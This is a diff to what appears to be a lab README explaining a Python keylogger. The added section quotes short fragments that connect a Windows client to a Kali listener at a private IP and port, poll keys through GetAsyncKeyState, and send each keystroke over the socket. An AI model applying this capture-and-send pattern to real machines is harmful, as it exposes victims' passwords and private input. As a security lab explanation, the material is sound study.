@@ -117,6 +117,34 @@ On Kali Linux, the following command is used:
 * ✔ Data is transmitted remotely
 * ✔ Listener receives input exactly as typed
 
+**6. Code Explanation (High Level)**
+
+* **✔ 1. Server Connection
+serverAddress = ('192.168.3.117', 9000)
+clientSocket.connect(serverAddress)
+
+
+Connects Windows machine to Kali listener.
+
+* **✔ 2. Capturing Keystrokes**
+user32.GetAsyncKeyState(i)
+
+
+Hooks into OS-level keyboard events.
+
+* **✔ 3. Key Mapping**
+
+A custom ASCII table maps raw key codes to readable names.
+
+* **✔ 4. Sending Data**
+clientSocket.sendall(key.encode())
+
+
+Every keystroke is sent as soon as pressed.
+
+* **✔ 5. Infinite Loop**
+
+Script keeps monitoring keys until closed.
 
 
 
